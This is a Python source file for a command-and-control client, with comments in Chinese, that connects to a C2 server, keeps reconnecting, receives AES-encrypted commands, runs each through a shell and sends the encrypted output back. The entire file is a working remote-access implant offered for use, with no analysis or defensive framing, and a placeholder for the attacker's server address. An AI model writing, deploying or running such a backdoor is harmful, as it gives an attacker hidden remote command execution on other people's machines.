import socket
import time
import os
import json
import base64
import subprocess
from Crypto.Cipher import AES

class C2Client:
    def __init__(self, server_ip, server_port):
        self.server_ip = server_ip
        self.server_port = server_port
        self.encryption_key = b'0123456789abcdef'  #16字节AES密钥

    def encrypt(self, message):
        cipher = AES.new(self.encryption_key, AES.MODE_EAX)
        nonce = cipher.nonce
        ciphertext, tag = cipher.encrypt_and_digest(message.encode())
        return base64.b64encode(nonce + ciphertext).decode()

    def decrypt(self, ciphertext):
        if not ciphertext:
            return ""
        raw_data = base64.b64decode(ciphertext)
        nonce = raw_data[:16]
        cipher = AES.new(self.encryption_key, AES.MODE_EAX, nonce=nonce)
        plaintext = cipher.decrypt(raw_data[16:])
        return plaintext.decode()

    def connect_to_server(self):
        while True:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.connect((self.server_ip, self.server_port))
                print("Connected to C2 server")
                break
            except Exception as e:
                print(f"Connection failed: {e}")
                time.sleep(5)

    def listen_for_commands(self):
        while True:
            try:
                encrypted_command = self.socket.recv(4096).decode()
                if not encrypted_command:
                    continue
                command = self.decrypt(encrypted_command)
                if command:
                    print(f"Received command: {command}")
                    if command == "exit":
                        self.socket.close()
                        break
                    else:
                        #使用subprocess执行命令并捕获输出
                        result = subprocess.run(command, shell=True, capture_output=True, text=True)
                        output = result.stdout + result.stderr
                        encrypted_result = self.encrypt(output)
                        self.socket.send(encrypted_result.encode())
            except Exception as e:
                print(f"Error: {e}")
                self.socket.close()
                self.connect_to_server()

if __name__ == "__main__":
    client = C2Client("IP地址", 8888)  #替换为C2服务器端IP地址
    client.connect_to_server()
    client.listen_for_commands()
